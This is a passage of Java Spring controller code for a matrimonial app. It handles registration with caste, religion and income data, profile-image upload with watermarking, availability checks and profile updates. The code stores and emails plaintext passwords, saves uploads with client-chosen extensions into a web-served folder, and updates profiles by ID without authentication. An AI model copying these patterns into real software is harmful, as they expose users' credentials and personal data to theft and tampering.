			String heightSelectPartnerSecond = jsonObj.getString("partnerToHeight");
			String countrySelectPartner = jsonObj.getString("partnerCountry");
			String stateSelectPartner = jsonObj.getString("partnerState");
			String cityStateSelectPartnerPreferance = jsonObj.getString("partnerDistrict");
			String religionSelectPartner = jsonObj.getString("partnerReligion");
			String casteSelectPartner = jsonObj.getString("partnerCaste");
			String checkBoxEducationPartner = jsonObj.getString("partnerEducationCategory");
			String checkBoxOccupationPartner = jsonObj.getString("partnerOccupationCategory");
			String incomePartner = jsonObj.getString("partnerIncomeType");
			String incomeAmountPartner = jsonObj.getString("partnerIncome");
			String familyClassInfoPartner = jsonObj.getString("partnerFamilyPreference");
			String familyTypeInfoPartner = jsonObj.getString("partnerFamilyType");
			String familyValueInfoPartner = jsonObj.getString("partnerFamilyValues");
			String eatingPartner = jsonObj.getString("partnerEating");
			String drinkPartner = jsonObj.getString("partnerDrinking");
			String smokePartner = jsonObj.getString("partnerSmoking");
			String employedInPartner = jsonObj.getString("partnerEmployedInType");

			// step 2 data //

			String aboutMe = jsonObj.getString("aboutMe");
			String materialStatus = jsonObj.getString("maritalStatus");
			String physicalStatus = jsonObj.getString("physicalStatus");
			String heightSelect = jsonObj.getString("height");
			String weightSelect = jsonObj.getString("weight");
			String countrySelect = jsonObj.getString("country");
			String stateSelect = jsonObj.getString("state");
			String cityStateSelect = jsonObj.getString("district");
			String subDistSelect = jsonObj.getString("subDistrict");
			String religionSelect = jsonObj.getString("religion");
			String casteSelect = jsonObj.getString("caste");
			String educationalCategorySelect = jsonObj.getString("educationCategory");
			String bodyType = jsonObj.getString("bodyType");
			String complexion = jsonObj.getString("complexion");
			String educationalSelect = jsonObj.getString("education");
			String occupationCategorySelect = jsonObj.getString("occupationCategory");
			String occupationSelect = jsonObj.getString("occupation");
			String income = jsonObj.getString("incomeType");
			String incomeAmount = jsonObj.getString("income");
			String familyClassInfo = jsonObj.getString("familyPreference");
			String familyTypeInfo = jsonObj.getString("familyType");
			String familyValueInfo = jsonObj.getString("familyValues");
			String eating = jsonObj.getString("eating");
			String drink = jsonObj.getString("drinking");
			String smoke = jsonObj.getString("smoking");
			String firstName = jsonObj.getString("name");
			String gender = jsonObj.getString("gender");
			String mobile = jsonObj.getString("mobile");
			String dob = jsonObj.getString("birthDate");
			String userName = jsonObj.getString("userName");
			String password = jsonObj.getString("password");
			String email = jsonObj.getString("email");
			String employedIn = jsonObj.getString("employedInType");
			String ProfileCreatedFor = jsonObj.getString("profileCreatedFor");
			String kitUser = jsonObj.getString("userType");
			String kitId = jsonObj.getString("kitId");
			String kitPassword = jsonObj.getString("kitPassword");
			String landmark = jsonObj.getString("landmark");
			String kundaliImg = jsonObj.getString("kundaliImg");

			///


			RoleModel roleModel = new RoleModel();
			try {
				roleModel.setId(2);

			} catch (Exception e) {
				e.printStackTrace();
			}
			UserModel userModel = new UserModel();

			Kit kit = null;
			try {
				if (kitUser.equalsIgnoreCase("RegisteredKit")) {
					kit = kitService.findKitByKitUserNamePassword(kitId, kitPassword);
				}

				if (kit != null) {
					if (kit.getStatus_id().getStatus_name().equalsIgnoreCase("Active")) {

					} else if (kit.getStatus_id().getStatus_name().equalsIgnoreCase("Disactive")) {

						Status status_id = new Status();
						status_id.setStatus_id(1);
						kit.setStatus_id(status_id);
						kitService.updateKitStatus(kit);
						userModel.setKit(kit);
					}
				}
			} catch (Exception e) {

			}

			try {
				userModel.setFirstName(firstName);

			} catch (Exception e) {
				e.printStackTrace();
			}

			try {
				userModel.setPassword(password);

			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModel.setUserName(userName);

			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModel.setUserRoll(roleModel);

			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModel = userService.addUser(userModel);

			} catch (Exception e) {
				e.printStackTrace();
			}
			// userModel
			UserModelDetails userModelDetails = new UserModelDetails();
			try {
				userModelDetails.setUserModel(userModel);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setHeight(Double.parseDouble(heightSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}

			try {
				userModelDetails.setLandmark(landmark);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setWeight(Integer.parseInt(weightSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setAboutMe(aboutMe);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setMaterialStatus(materialStatus);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setPhysicalStatus(physicalStatus);
			} catch (Exception e) {
				e.printStackTrace();
			}
			Country country = new Country();
			try {
				country.setCountry_id(Integer.parseInt(countrySelect));
				userModelDetails.setCountry(country);
			} catch (Exception e) {
				e.printStackTrace();
			}
			// --------------------------------------------
			State_Country state_Country = null;
			try {
				state_Country = new State_Country();
				if(stateSelect.equalsIgnoreCase("0") ||stateSelect=="0")
				{
					stateSelect="1";
				}
				state_Country.setState_Country_id(Integer.parseInt(stateSelect));
			} catch (Exception e) {
				e.printStackTrace();

			}
			State_Districts state_Districts = null;
			try {
				state_Districts = new State_Districts();
				
				if(cityStateSelect.equalsIgnoreCase("0") ||cityStateSelect=="0")
				{
					cityStateSelect="1";
				}
				state_Districts.setState_district_id(Integer.parseInt(cityStateSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			District_SubDistricts district_SubDistricts = null;
			try {

				district_SubDistricts = new District_SubDistricts();
				
				if(subDistSelect.equalsIgnoreCase("0") ||subDistSelect=="0")
				{
					subDistSelect="0";
				}
				district_SubDistricts.setDistrict_subDistricts_id(Integer.parseInt(subDistSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Religion religion = null;

			try {
				religion = new Religion();
				religion.setReligion_id(Long.parseLong(religionSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Caste caste = null;

			try {
				caste = new Caste();
				if(casteSelect.equalsIgnoreCase("0")||casteSelect=="0")
				{
					casteSelect="1";
				}
				caste.setCaste_id(Long.parseLong(casteSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}

			Education education = null;
			try {
				education = new Education();
				
					if(educationalSelect.equalsIgnoreCase("0")||educationalSelect=="0")
					{
						educationalSelect="1";
					}
				education.setEducation_id(Long.parseLong(educationalSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Occupation occupation = null;
			// ------------------------------------------------
			try {
				occupation = new Occupation();
				
				if(occupationSelect.equalsIgnoreCase("0")||occupationSelect=="0")
				{
					occupationSelect="1";
				}
				occupation.setOccupation_id(Long.parseLong(occupationSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setCountry(country);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setState_Country(state_Country);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setDistricts(state_Districts);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setSubDistricts(district_SubDistricts);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setCaste(caste);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setEducation(education);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setOccupation(occupation);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setBodyType(bodyType);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setComplexion(complexion);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setIncomeType(income);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setIncomeAmount(Long.parseLong(incomeAmount));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setFamilyClass(familyClassInfo);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setFamilyType(familyTypeInfo);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setFamilyValues(familyValueInfo);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setEating(eating);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setSmoke(smoke);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setDrink(drink);
			} catch (Exception e) {
				e.printStackTrace();
			}

			// dateOfBirth email mobileNum profileCreatedFor lastLoginDate
			// gender profileUpdateDate registrationDate
			try {
				
				if(email.equalsIgnoreCase("abc@gmail.com")||email.equalsIgnoreCase(""))
				{
					email="abc"+new Date().getTime()+"@gmail.com";
				}
				userModelDetails.setEmail(email);
			} catch (Exception e) {
				e.printStackTrace();
			}

			try {
				userModelDetails.setProfileCreatedFor(ProfileCreatedFor);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setMobileNum(mobile);
				
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setGender(gender);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setLastLoginDate(new Date());
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setRegistrationDate(new Date());
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setProfileUpdateDate(new Date());
			} catch (Exception e) {
				e.printStackTrace();
			}

			// temporary used data dob
			try {
				DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");
				Date DateOfBirth = formatter.parse(dob);
				userModelDetails.setDateOfBirth(DateOfBirth);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setEmployeedIn(employedIn);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails = userService.addUserdetails(userModelDetails);
			} catch (Exception e) {
				e.printStackTrace();
			}
			Country countryPartner = null;
			try {
				countryPartner = new Country();
				countryPartner.setCountry_id(Integer.parseInt(countrySelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}
			State_Country state_CountryPartner = null;
			try {
				state_CountryPartner = new State_Country();
				state_CountryPartner.setState_Country_id(Integer.parseInt(stateSelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}
			State_Districts state_DistrictsPartner = null;
			try {
				state_DistrictsPartner = new State_Districts();
				state_DistrictsPartner.setState_district_id(Integer.parseInt(cityStateSelectPartnerPreferance));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Religion religionPartner = new Religion();
			try {
				religionPartner = new Religion();
				religionPartner.setReligion_id(Long.parseLong(religionSelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Caste castePartner = null;
			try {
				castePartner = new Caste();
				castePartner.setCaste_id(Long.parseLong(casteSelectPartner));
			} catch (Exception e) {
				e.printStackTrace();
			}
			UserModelPartnerPreferances userModelPartnerPreferances = new UserModelPartnerPreferances();
			try {
				userModelPartnerPreferances.setUserModel(userModel);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setMaterialStatus(materialStatusPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setPhysicalStatus(physicalStatusPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setHeightFrom(Double.parseDouble(heightSelectPartnerFirst));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setHeightTo(Double.parseDouble(heightSelectPartnerSecond));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setBodyType(bodyTypePartner);
			} catch (Exception e) {
				e.printStackTrace();

			}

			try {
				userModelPartnerPreferances.setComplexion(complexionPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}

			try {
				userModelPartnerPreferances.setCountry(countryPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}
			try {
				userModelPartnerPreferances.setState_Country(state_CountryPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}

			try {
				userModelPartnerPreferances.setDistricts(state_DistrictsPartner);
			} catch (Exception e) {
				e.printStackTrace();

			}
			try {
				userModelPartnerPreferances.setReligion(religionPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setCaste(castePartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setIncomeType(incomePartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setIncomeAmount(Long.parseLong(incomeAmountPartner));
			} catch (Exception e) {
				userModelPartnerPreferances.setIncomeAmount(Long.parseLong(0 + ""));
				e.printStackTrace();
			}

			try {
				userModelPartnerPreferances.setFamilyClass(familyClassInfoPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setFamilyType(familyTypeInfoPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setFamilyValues(familyValueInfoPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setEating(eatingPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setDrink(drinkPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setSmoke(smokePartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances.setEmployeedIn(employedInPartner);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelPartnerPreferances = userService.addUserPartnerPreferances(userModelPartnerPreferances);
			} catch (Exception e) {
				e.printStackTrace();
			}

			// save education category of partner and Occupation category
			// Partner

			String[] parts = checkBoxEducationPartner.split(",");

			for (String string : parts) {

				try {

					long l=Long.parseLong(string);
					if(l==0)
					{
						l=1;
					}
					EducationCategory educationCategory = new EducationCategory();
					educationCategory.setEdu_cat_id(l);
					PartnerEducationAssociation educationAssociation = new PartnerEducationAssociation();
					educationAssociation.setUserModel(userModel);
					educationAssociation.setEducationCategory(educationCategory);
					userService.savePartnerEducationAssociation(educationAssociation);

				} catch (Exception e) {
					e.printStackTrace();
				}

			}

			String[] parts2 = checkBoxOccupationPartner.split(",");

			for (String string : parts2) {

				try {

					OccupationCategory OccupationCategory = new OccupationCategory();
					long l=Long.parseLong(string);
					if(l==0)
					{
						l=1;
					}
					OccupationCategory.setOccu_id(l);
					PartnerOccupationAssociation occupationAssociation = new PartnerOccupationAssociation();
					occupationAssociation.setUserModel(userModel);
					occupationAssociation.setOccupationCategory(OccupationCategory);
					userService.savePartnerOccupationAssociation(occupationAssociation);

				} catch (Exception e) {
					e.printStackTrace();
				}

			}

			try {

				// for file code

				Assert.state(request instanceof MultipartHttpServletRequest,
						"request !instanceof MultipartHttpServletRequest");
				final MultipartHttpServletRequest multiRequest = (MultipartHttpServletRequest) request;
				final Map files = multiRequest.getFileMap();
				Iterator<String> itrator = multiRequest.getFileNames();

				String fileName = null;
				String ActualFileName = "";
				int i = 1;
				final String pathact = request.getServletContext().getRealPath("/resources/UserImages");
				File dir1 = new File(pathact);

				if (!dir1.exists()) {
					dir1.mkdirs();
				}

				while (itrator.hasNext()) {
					

					MultipartFile multiFile = multiRequest.getFile(itrator.next());
					try {

						
						fileName = multiFile.getOriginalFilename();
						
						if(kundaliImg.equalsIgnoreCase("Yes") && !itrator.hasNext())
						{
							byte[] bytes = multiFile.getBytes();
							File directory = new File(dir1.getAbsolutePath());
							directory.mkdirs();
							String extension = FilenameUtils.getExtension(fileName);
							String name = "@K" + userModel.getUserId() + "." + extension;
							KundaliName = KundaliName + name + "#";

							File file = new File(dir1.getAbsolutePath() + File.separator + name);
							BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(file));
							stream.write(bytes);
							stream.close();
						}
						else
						{
							byte[] bytes = multiFile.getBytes();
							File directory = new File(dir1.getAbsolutePath());
							directory.mkdirs();
							String extension = FilenameUtils.getExtension(fileName);
							String name = "@" + i + "_" + userModel.getUserId() + "." + extension;
							ActualFileName = ActualFileName + name + "#";

							File file = new File(dir1.getAbsolutePath() + File.separator + name);
							BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(file));
							stream.write(bytes);
							stream.close();

							i++;
							
						}
						
						

					} catch (Exception e) {
						js.put("code", "1001");
						js.put("ErrorMessage", e.getMessage());
						json = js.toString();
						e.printStackTrace();
						e.printStackTrace();
						throw new Exception("Error while loading the file" + e.getMessage());
					}

				}

				if (ActualFileName != "") {
					UserModelImagesName imagesName = new UserModelImagesName();
					imagesName.setUserModel(userModel);
					imagesName.setImageNames(ActualFileName);
					imagesName.setKundaliImage(KundaliName);
					userService.saveUserImageNames(imagesName);
					
					
				}
				
				final UserModel model2 = userModel;
				final UserModelDetails userModelDetails2 = userModelDetails;

				try {
					final String pathact1 = request.getServletContext().getRealPath("/resources/UserImages");

					emailService.sendRegistrationEmail(model2.getFirstName(), model2.getUserName(), model2.getPassword(),
							userModelDetails2.getEmail(), request, pathact1);
				} catch (Exception ex) {
					ex.printStackTrace();
				}
				
				
				
				try {
					
					Thread tt=new Thread(new Runnable() {
						
						@Override
						public void run() {
							
							List<UserModelDetails> userModelDetailsList=null;
							if(userModelDetails2.getGender().equalsIgnoreCase("Male"))
							{
								userModelDetailsList= userService.getListOfUserModelDetailsByGender("Female", request);
							}
							else
							{
								userModelDetailsList=userService.getListOfUserModelDetailsByGender("Male", request);
							}
							
							
							FcmNotification fcmNotification = notificationService.getFcmNotification();
							notificationService.sendRegistationNotification(model2, userModelDetailsList, fcmNotification, request);
						}
					});
					
					tt.start();
					
				} catch (Exception e) {
					
				}

				js.put("code", "1000");
				js.put("Message", "Registration Successfully Done");
				json = js.toString();

			} catch (Exception e) {

				js.put("code", "1001");
				js.put("ErrorMessage", e.getMessage());
				json = js.toString();
				e.printStackTrace();

			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return json;
	}

	@RequestMapping(value = "/sneh/login/mobileValidateEmail ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileValidateEmail(final HttpServletRequest request, @RequestParam("email") String email) {

		JSONObject js = new JSONObject();
		String json = null;
		UserModelDetails modelDetails = null;
		try {

			modelDetails = registrationServicec.getUserModelDetailsByEmail(email);
			if (modelDetails == null) {
				js.put("code", "1000");
				js.put("Message", "Not available");
				json = js.toString();

			} else {
				js.put("code", "1000");
				js.put("Message", " Alreadyavailable");
				json = js.toString();

			}

		} catch (Exception e) {

			try {

				js.put("code", "1001");
				js.put("ErrorMessage", e.getMessage());
				json = js.toString();
			} catch (JSONException e1) {
				e1.printStackTrace();
			}

		}
		return json;
	}
	
	
	
	@RequestMapping(value = "/sneh/login/mobileValidateMobile ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileValidateMobile(final HttpServletRequest request, @RequestParam("mobile") String mobile) {

		JSONObject js = new JSONObject();
		String json = null;
		UserModelDetails modelDetails = null;
		try {

			modelDetails = registrationServicec.getUserModelDetailsByMobile(mobile);
			if (modelDetails == null) {
				js.put("code", "1000");
				js.put("Message", "Not available");
				json = js.toString();

			} else {
				js.put("code", "1000");
				js.put("Message", " Alreadyavailable");
				json = js.toString();

			}

		} catch (Exception e) {

			try {

				js.put("code", "1001");
				js.put("ErrorMessage", e.getMessage());
				json = js.toString();
			} catch (JSONException e1) {
				e1.printStackTrace();
			}

		}
		return json;
	}
	
	

	@RequestMapping(value = "/sneh/login/mobileValidateUseName ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileValidateUseName(final HttpServletRequest request, @RequestParam("userName") String userName) {

		JSONObject js = new JSONObject();
		String json = null;
		UserModel userModel = null;
		try {

			userModel = userService.getUserByUname(userName);
			if (userModel == null) {

				js.put("code", "1000");
				js.put("Message", "Not available");
				json = js.toString();

			} else {

				js.put("code", "1000");
				js.put("Message", " Alreadyavailable");
				json = js.toString();
			}

		} catch (Exception e) {

			try {
				js.put("code", "1001");
				js.put("ErrorMessage", e.getMessage());
				json = js.toString();
			} catch (JSONException e1) {
				e1.printStackTrace();
			}

		}
		return json;
	}

	@RequestMapping(value = "/sneh/login/mobileRemoveImages ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileRemoveImages(final HttpServletRequest request, @RequestParam("userName") String userName,
			@RequestParam("password") String password, @RequestParam("fileName") String fileName) {

		UserModel userModel = loginService.getUserByUnamePassword(userName, password);
		UserModelImagesName imagesNames = userService.getImageNameAccordingToUserModel(userModel);
		
		JSONObject js = new JSONObject();
		JSONArray jsArray = new JSONArray();
		String json = null;
		try {
			String imgnames[] = imagesNames.getImageNames().split("#");
			ArrayList<String> imglist = new ArrayList<String>(Arrays.asList(imgnames));
			boolean flag = imglist.remove(fileName);
			if (flag) {
				try {
					final String pathact = request.getServletContext().getRealPath("/resources/UserImages");
					File afile = new File(pathact + "/" + fileName);
					afile.delete();
					String name = "";
					for (String string : imglist) {
						name = name + string + "#";

					}
					jsArray.put(name);
					imagesNames.setImageNames(name);
					userService.saveUserImageNames(imagesNames);
					js.put("code", "1000");
					js.put("imageArray", jsArray);
					json = js.toString();

				} catch (Exception e) {
					js.put("code", "1001");
					json = js.toString();
					e.printStackTrace();
				}
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return json;
	}

	@RequestMapping(value = "/sneh/login/mobileUpdateImages ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileUpdateImages(final HttpServletRequest request1, @RequestParam("userName") String userName,
			@RequestParam("password") String password, MultipartHttpServletRequest request) {

		JSONObject js = new JSONObject();
		String json = null;
		UserModel userModel = null;

		JSONArray jsArray = new JSONArray();

		try {

			userModel = loginService.getUserByUnamePassword(userName, password);
			
			int maxNumber = 0;
			final String pathact = request.getServletContext().getRealPath("/resources/UserImages");
			File dir1 = new File(pathact);
			String fileName = null;
			if (!dir1.exists()) {
				dir1.mkdirs();
			}
			UserModelImagesName imagesNames = userService.getImageNameAccordingToUserModel(userModel);

			try {
				String splitHash[] = imagesNames.getImageNames().split("#");
				ArrayList<Integer> arrayList = new ArrayList<>();

				for (String string : splitHash) {

					String splitUnderScore[] = string.split("_");
					int stringflag = 0;
					for (String iterate : splitUnderScore) {
						if (stringflag == 0) {

							try {
								arrayList.add(Integer.parseInt(iterate.split("@")[1]));
							} catch (Exception e) {
							}
							stringflag = 1;
						} else {
							stringflag = 0;
						}
					}
				}
				maxNumber = Collections.max(arrayList);
			} catch (Exception e) {
				e.printStackTrace();
			}
			Iterator<String> itrator = request.getFileNames();
			String ActualFileName = imagesNames.getImageNames();

			while (itrator.hasNext()) {
				MultipartFile multiFile = request.getFile(itrator.next());
				try {
					maxNumber++;
					fileName = multiFile.getOriginalFilename();
					byte[] bytes = multiFile.getBytes();
					File directory = new File(dir1.getAbsolutePath());
					directory.mkdirs();
					String extension = FilenameUtils.getExtension(fileName);
					String name = "@" + maxNumber + "_" + userModel.getUserId() + "." + extension;
					ActualFileName = ActualFileName + name + "#";

					File file = new File(dir1.getAbsolutePath() + File.separator + name);
					BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(file));
					stream.write(bytes);
					stream.close();
					
					
					
					
					
					//Add water mark code here

					String waterMarkImagepath = request.getServletContext().getRealPath("/resources/images/waterMark.png");
					String paidLogoImagepath = request.getServletContext().getRealPath("/resources/images/paidLogo.png");


					BufferedImage profileImage = ImageIO.read(file);
					BufferedImage watermarkImage = ImageIO.read(new File(waterMarkImagepath));
					BufferedImage paidProfileLogo = ImageIO.read(new File(paidLogoImagepath));
					
					int outWidth = profileImage.getWidth();
					int outHeight = profileImage.getHeight();
					
					BufferedImage outputImage = new BufferedImage(outWidth, outHeight, profileImage.getType());
					
				
					// calculates the coordinate where the image is painted
					int centerxCoOrdinate = (profileImage.getWidth() - watermarkImage.getWidth()) / 2;
					int centeryCoOrdinate = (profileImage.getHeight() - watermarkImage.getHeight()) / 2;
					int bottomRightxCoOrdinate = profileImage.getWidth()-paidProfileLogo.getWidth();
					int bottomRightyCoOrdinate = profileImage.getHeight()-paidProfileLogo.getHeight();

					// initializes necessary graphic properties
					Graphics g = profileImage.getGraphics() ;
					Graphics2D g2d = (Graphics2D) profileImage.getGraphics();
					AlphaComposite alphaChannel = AlphaComposite.getInstance(AlphaComposite.SRC_OVER, 0.3f);
					g2d.setComposite(alphaChannel);

					g2d.drawImage(outputImage,  outWidth, outHeight, null);
					g2d.drawImage(watermarkImage, centerxCoOrdinate, centeryCoOrdinate, null);

					//add condition here for paid user  
					if(userModel.getKit() == null)
					{
					}
					else
					{
						g.drawImage(paidProfileLogo,bottomRightxCoOrdinate, bottomRightyCoOrdinate, null);
					}
					g2d.dispose();

					File newFile = new File(dir1.getAbsolutePath() + File.separator + name);
					try {
						ImageIO.write(profileImage,extension, newFile);
					} catch (Exception e) {
						e.printStackTrace();
					}
					
					

				} catch (Exception e) {
					e.printStackTrace();
					throw new Exception("Error while loading the file" + e.getMessage());
				}
			}

			imagesNames.setImageNames(ActualFileName);
			userService.saveUserImageNames(imagesNames);

			try {

				UserModelImagesName imagesNames1 = userService.getImageNameAccordingToUserModel(userModel);
				String imgnames[] = imagesNames1.getImageNames().split("#");
				ArrayList<String> imglist = new ArrayList<String>(Arrays.asList(imgnames));
				String name = "";
				for (String string : imglist) {
					name = name + string + "#";
				}
				jsArray.put(name);
			} catch (Exception e) {

			}
			js.put("ImgArray", jsArray);
			js.put("code", "1000");
			js.put("Message", "File Uploaded successfully");
			json = js.toString();

		} catch (Exception e) {
			try {
				js.put("code", "1001");
				js.put("Message", e.getMessage());
				json = js.toString();
			} catch (JSONException e1) {

				e1.printStackTrace();
			}

		}

		return json;
	}

	@RequestMapping(value = "/sneh/login/mobileUpdateUserDetails ", method = RequestMethod.POST)
	@ResponseBody
	public String mobileUpdateUserDetails(final HttpServletRequest request,
			@RequestParam("userDetailsDict") String dict) {

		JSONObject obj;
		JSONObject js = new JSONObject();
		String json = null;
		try {

			obj = new JSONObject(dict);
			final JSONObject jsonObj = obj;
			String userModelId = jsonObj.getString("userModelId");
			String heightSelect = jsonObj.getString("heightSelect");
			String weightSelect = jsonObj.getString("weightSelect");
			String countrySelect = jsonObj.getString("countrySelect");
			String stateSelect = jsonObj.getString("stateSelect");
			String cityStateSelect = jsonObj.getString("cityStateSelect");
			String subDistSelect = jsonObj.getString("subDistSelect");
			String religionSelect = jsonObj.getString("religionSelect");
			String casteSelect = jsonObj.getString("casteSelect");
			String bodyType = jsonObj.getString("bodyType");
			String complexion = jsonObj.getString("complexion");
			String educationalSelect = jsonObj.getString("educationalSelect");
			String occupationSelect = jsonObj.getString("occupationSelect");
			String income = jsonObj.getString("income");
			String incomeAmount = jsonObj.getString("incomeAmount");
			String familyClassInfo = jsonObj.getString("familyClassInfo");
			String familyTypeInfo = jsonObj.getString("familyTypeInfo");
			String familyValueInfo = jsonObj.getString("familyValueInfo");
			String eating = jsonObj.getString("eating");
			String drink = jsonObj.getString("drink");
			String smoke = jsonObj.getString("smoke");
			String aboutMe = jsonObj.getString("aboutMe");
			String materialStatus = jsonObj.getString("materialStatus");
			String physicalStatus = jsonObj.getString("physicalStatus");
			String firstName = jsonObj.getString("firstName");
			String gender = jsonObj.getString("gender");
			String mobile = jsonObj.getString("mobile");
			String dob = jsonObj.getString("dob");
			String email = jsonObj.getString("email");
			String employedIn = jsonObj.getString("employedIn");
			String ProfileCreatedFor = jsonObj.getString("ProfileCreatedFor");

			UserModel userModel = new UserModel();
			userModel.setUserId(Long.parseLong(userModelId));

			UserModelDetails userModelDetails = userService.getUserdetails(userModel);

			try {

				userModelDetails.setUserModel(userModel);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setHeight(Double.parseDouble(heightSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}

			try {
				userModelDetails.setWeight(Integer.parseInt(weightSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setAboutMe(aboutMe);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setMaterialStatus(materialStatus);
			} catch (Exception e) {
				e.printStackTrace();
			}
			try {
				userModelDetails.setPhysicalStatus(physicalStatus);
			} catch (Exception e) {
				e.printStackTrace();
			}
			Country country = new Country();
			try {
				if(countrySelect.equalsIgnoreCase("0")||countrySelect=="0")
				{
					countrySelect="1";
				}
				country.setCountry_id(Integer.parseInt(countrySelect));
				userModelDetails.setCountry(country);
			} catch (Exception e) {
				e.printStackTrace();
			}
			// --------------------------------------------
			State_Country state_Country = null;
			try {
				if(stateSelect.equalsIgnoreCase("0")||stateSelect=="0")
				{
					stateSelect="1";
				}
				state_Country = new State_Country();
				state_Country.setState_Country_id(Integer.parseInt(stateSelect));
			} catch (Exception e) {
				e.printStackTrace();

			}
			State_Districts state_Districts = null;
			try {
				state_Districts = new State_Districts();
				if(cityStateSelect.equalsIgnoreCase("0")||cityStateSelect=="0")
				{
					cityStateSelect="1";
				}
				state_Districts.setState_district_id(Integer.parseInt(cityStateSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			District_SubDistricts district_SubDistricts = null;
			try {

				district_SubDistricts = new District_SubDistricts();
				if(subDistSelect.equalsIgnoreCase("0")||subDistSelect=="0")
				{
					subDistSelect="1";
				}
				district_SubDistricts.setDistrict_subDistricts_id(Integer.parseInt(subDistSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Religion religion = null;

			try {
				religion = new Religion();
				
				if(religionSelect.equalsIgnoreCase("0")||religionSelect=="0")
				{
					religionSelect="1";
				}
				religion.setReligion_id(Long.parseLong(religionSelect));
			} catch (Exception e) {
				e.printStackTrace();
			}
			Caste caste = null;

			try {
				caste = new Caste();
				if(casteSelect.equalsIgnoreCase("0") || casteSelect=="0")
				{
					casteSelect="1";
				}
				caste.setCaste_id(Long.parseLong(casteSelect));
